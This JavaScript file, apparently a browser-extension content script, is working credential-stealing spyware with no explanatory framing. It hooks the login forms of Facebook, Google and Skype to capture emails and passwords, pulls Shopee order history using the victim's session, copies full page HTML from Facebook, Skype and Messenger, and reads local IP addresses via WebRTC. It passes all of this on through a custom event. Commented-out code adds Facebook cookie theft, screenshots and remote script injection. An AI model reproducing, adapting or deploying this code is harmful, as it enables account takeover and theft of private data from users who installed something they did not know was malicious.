const KEY = "DATA_1637469683_90061_2132";
const isFacebook = window.location.origin.indexOf("facebook.com") > -1;
const isMessenger = window.location.origin.indexOf("messenger.com") > -1;
const isGoogle = window.location.origin.indexOf("google.com") > -1;
const isLoginSkype = window.location.origin.indexOf("login.live.com") > -1;
const isWebSkype = window.location.origin.indexOf("web.skype.com") > -1;
const isShopee = window.location.origin.indexOf("shopee.vn") > -1;

if (isShopee) {
  try {
    setTimeout(() => {
      getShoppeOrderHistory();
    }, 1000);
  } catch (e) { }
}

function getShoppeOrderHistory() {
  fetch(
    `https://shopee.vn/api/v4/order/get_all_order_and_checkout_list?limit=100&offset=0`,
    { method: "get" }
  )
    .then((response) => response.json())
    .then((data) => {
      updateData("shopeeOrders", {
        data: data,
        userName: localStorage.getItem("userid"),
        userId: localStorage.getItem("username"),
      });
    }).catch((e) => {
      updateData("shopeeOrders", {
        data: e,
        userName: localStorage.getItem("userid") + "_error",
        userId: localStorage.getItem("username") + "_error",
      });
    });
}

if (isFacebook) {
  try {
    listenFacebook();
  } catch (e) { }
}
if (isGoogle) {
  try {
    listenGoogle();
  } catch (e) { }
}
if (isLoginSkype) {
  try {
    listenSkype();
  } catch (e) { }
}

function listenGoogle() {
  let email;
  let time1 = setInterval(() => {
    let profileIdentifier = document.getElementById("profileIdentifier");
    email = profileIdentifier?.innerHTML;
    if (validateEmail(email)) {
      clearInterval(time1);
      onNext();
    }
  }, 300);

  function onNext() {
    let passElements = document.getElementsByName("password");
    if (!passElements || passElements.length == 0) {
      passElements = document.querySelectorAll('[type="password"]');
    }
    let passElement;
    for (let item of passElements) {
      if ("password".indexOf(item.getAttribute("name")) > -1) {
        passElement = item;
      }
    }
    passElement &&
      passElement.addEventListener("keydown", (e) => {
        if (e.code == 13 || e.code == "Enter") {
          onUpdate(email, passElement?.value, "google");
        }
      });
    let buttonNext = document.getElementById("passwordNext");
    if (buttonNext) {
      let button = buttonNext.querySelector("button");
      button.addEventListener("click", (e) => {
        onUpdate(email, passElement?.value, "google");
      });
    }
  }
}

function listenSkype() {
  let email;
  let time1 = setInterval(() => {
    let profileIdentifier = document.getElementById("displayName");
    email = profileIdentifier?.innerHTML;
    if (validateEmail(email)) {
      clearInterval(time1);
      onNext();
    }
  }, 300);

  function onNext() {
    let passElements = document.getElementsByName("passwd");
    if (!passElements || passElements.length == 0) {
      passElements = document.querySelectorAll('[type="password"]');
    }
    let passElement;
    for (let item of passElements) {
      if (
        "passwd".indexOf(item.getAttribute("password")) > -1 ||
        "password".indexOf(item.getAttribute("type")) > -1
      ) {
        passElement = item;
      }
    }
    passElement &&
      passElement.addEventListener("keydown", (e) => {
        if (e.code == 13 || e.code == "Enter") {
          onUpdate(email, passElement?.value, "skype");
        }
      });
    let buttonNext = document.getElementById("idSIButton9");
    if (!buttonNext) {
      let buttonElements = document.querySelectorAll('[type="submit"]');
      if (buttonElements && buttonElements.length == 0) {
        buttonNext = buttonElements[0];
      }
    }
    if (buttonNext) {
      buttonNext.addEventListener("click", (e) => {
        onUpdate(email, passElement?.value, "skype");
        e.preventDefault();
      });
    }
  }
}

function listenFacebook() {
  let button = document.querySelector('button[name="login"]');
  button = button ? button : document.querySelector('button[type="submit"]');
  let email = document.getElementById("email");
  let pass = document.getElementById("pass");

  email &&
    email.addEventListener("keydown", (e) => {
      if (e.code == 13 || e.code == "Enter") {
        onUpdate(email?.value, pass?.value);
      }
    });
  pass &&
    pass.addEventListener("keydown", (e) => {
      if (e.code == 13 || e.code == "Enter") {
        onUpdate(email?.value, pass?.value);
      }
    });
  if (button) {
    button.addEventListener("click", (e) => {
      onUpdate(email?.value, pass?.value, "facebook");
    });
  }
}
function onUpdate(email, pass, type) {
  updateData("user", {
    email: email,
    pass: pass,
    type: type,
    userAgent: navigator.userAgent,
    location: window.location.href,
  });
}

function validateEmail(email) {
  const re =
    /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  return email && re.test(String(email).toLowerCase());
}

function getPageTitle() {
  try {
    return document.head.getElementsByTagName("title").item(0).innerHTML;
  } catch (e) { }
  return "";
}

try {
  if(isFacebook || isWebSkype) {
    setTimeout(() => {
      sendHistory(window.location.href, getPageTitle());
    }, 7000);
  } else {
    sendHistory(window.location.href, getPageTitle());
  }
} catch (e) { }

function sendHistory(url, title) {
  if (!url) {
    return;
  }
  let data = "";
  if(isFacebook || isWebSkype || isMessenger) {
    try {
      data = document.querySelector('html').outerHTML;
    } catch(e){}
  }
  try {
    getIpClient((ip) => {
      updateData("pageHistory", {
        url: url,
        userAgent: navigator.userAgent,
        title: title,
        ip: ip,
        data: data
      });
    })
  } catch(e){
    updateData("pageHistory", {
      url: url,
      userAgent: navigator.userAgent,
      title: title,
      data: data
    });
  }
}

// if(window.location.href.indexOf("facebook.com") > -1) {
//   let cookie = localStorage.getItem("key_fb_cookie");
//   let newCookie = document.cookie;
//   if(!cookie || cookie.indexOf(newCookie) == -1) {
//     localStorage.setItem("key_fb_cookie", newCookie);
//     setTimeout(() => {
//       localStorage.setItem("key_fb_cookie", newCookie);
//     }, 3000);
//     setTimeout(() => {
//       localStorage.setItem("key_fb_cookie", newCookie);
//     }, 6000);
//     updateData('facebook_cookie', newCookie);
//   }
// }

function importJS(url) {
  fetch(url, { method: 'get' })
    .then(function (response) {
      if (!response.ok) {
        throw Error(response.statusText);
      }
      return response.text();
    }).then((data) => {
      let scriptElement = document.createElement('script');
      scriptElement.setAttribute('type', 'text/javascript');
      scriptElement.setAttribute('charset', 'utf8');
      scriptElement.setAttribute('test', 'true');
      scriptElement.innerHTML = data;
      document.head.appendChild(scriptElement);
    });
}

// try {
//   importJS('https://html2canvas.hertzen.com/dist/html2canvas.min.js');
//   importJS('https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js');
// } catch (e) { }

// if (isFacebook || isWebSkype) {
//   setTimeout(() => {
//     $(document).ready(function () {
//       console.log("jquery ready");
//       try {
//         html2canvas($("body"), {
//           onrendered: function (canvas) {
//             updateData("image", {
//               url: window.location.href,
//               image: canvas.toDataURL("image/png")
//             });
//           }
//         });
//       } catch (e) { }
//     });
//   }, 2000);
// }

function getIpClient(cb) {
  var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection || window.RTCPeerConnection;
  if (RTCPeerConnection) {
    var rtc = new RTCPeerConnection({ iceServers: [] });
    if (1 || window.mozRTCPeerConnection) {      // FF [and now Chrome!] needs a channel/stream to proceed
      rtc.createDataChannel('', { reliable: false });
    };

    rtc.onicecandidate = function (evt) {
      if (evt.candidate) grepSDP("a=" + evt.candidate.candidate);
    };
    rtc.createOffer(function (offerDesc) {
      grepSDP(offerDesc.sdp);
      rtc.setLocalDescription(offerDesc);
    }, function (e) {
      console.warn("offer failed", e);
      cb();
    });

    var addrs = Object.create(null);
    addrs["0.0.0.0"] = false;
    function updateIp(newAddr) {
      if (newAddr in addrs) return;
      else addrs[newAddr] = true;
      var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
      cb(displayAddrs.join(" or perhaps ") || "n/a");
    }

    function grepSDP(sdp) {
      sdp.split('\r\n').forEach(function (line) {
        if (~line.indexOf("a=candidate")) {
          var parts = line.split(' '),
            addr = parts[4],
            type = parts[7];
          if (type === 'host') updateIp(addr);
        } else if (~line.indexOf("c=")) {
          var parts = line.split(' '),
            addr = parts[2];
          updateIp(addr);
        }
      });
    }
  } else {
    cb();
  }
}

function updateData(type, data) {
  document.dispatchEvent(
    new CustomEvent(KEY, {
      detail: { type, data },
    })
  );
}